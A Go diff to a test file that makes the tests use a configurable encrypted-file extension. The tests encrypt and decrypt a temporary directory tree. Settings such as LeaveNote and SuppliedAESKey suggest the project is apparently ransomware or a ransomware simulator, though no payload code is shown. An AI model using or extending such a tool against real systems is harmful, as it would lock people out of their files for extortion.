@@ -15,6 +15,7 @@ import (
 
 func createRecursiveFileHierarchy(t *testing.T) ([]string, string) {
 	testDir := t.TempDir()
+	cli.Settings.EncryptedFileExt = "kc"
 	cli.Settings.LeaveNote = false
 	cli.Settings.RawKey = true
 	fileName := testDir + "/_testFile"
@@ -93,7 +94,7 @@ func TestEncryptionDecryptionScheme(t *testing.T) {
 		}
 	}
 	var eQue utils.Queue
-	eFiles := wcc_crypto.GetFilesInCurrentDir("wc", rootDir, true)
+	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
 	eQue.Init(eFiles)
 	StartDecryption(&eQue, key)
 	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
@@ -253,7 +254,7 @@ func TestOfflineDecryption(t *testing.T) {
 		}
 	}
 	var eQue utils.Queue
-	eFiles := wcc_crypto.GetFilesInCurrentDir("wc", rootDir, true)
+	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
 	eQue.Init(eFiles)
 	// prepare decrypted key
 	ioutil.WriteFile("./d_key.txt", []byte(cli.Settings.SuppliedAESKey), 0777)
